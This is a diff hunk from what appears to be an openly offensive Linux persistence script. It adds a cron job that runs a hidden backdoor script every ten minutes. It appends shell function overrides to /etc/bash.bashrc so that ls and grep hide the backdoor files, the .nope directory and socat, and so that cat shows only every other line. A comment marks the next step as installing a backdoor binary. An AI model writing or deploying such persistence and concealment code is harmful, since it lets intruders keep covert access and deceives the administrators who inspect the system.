@@ -61,9 +61,9 @@ CRON_JOB="*/10 * * * * /var/.lib/.nope/back.sh >/dev/null 2>&1"
 (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
 
 # Fun stuff with commands! ;)
-echo "cat() {command cat \"$@\" | awk 'NR % 2 == 0'}"
-echo "grep() {command grep --exclude-dir=.nope --exclude='*socat' \"$@\"}" >> /etc/bash.bashrc
-echo "ls() {command ls --color=auto \"$@\" | grep -vE 'back\.(sh|py)$'}" >> /etc/bash.bashrc
+echo 'cat() { command cat "$@" | awk "NR % 2 == 0"; }' >> /etc/bash.bashrc
+echo 'grep() { command grep --exclude-dir=.nope --exclude="*socat" "$@"; }' >> /etc/bash.bashrc
+echo 'ls() { command ls --color=auto "$@" | grep -vE "back\.(sh|py)$"; }' >> /etc/bash.bashrc
 
 ### Install and schedule a Backdoor Binary
 # Get the code to compile
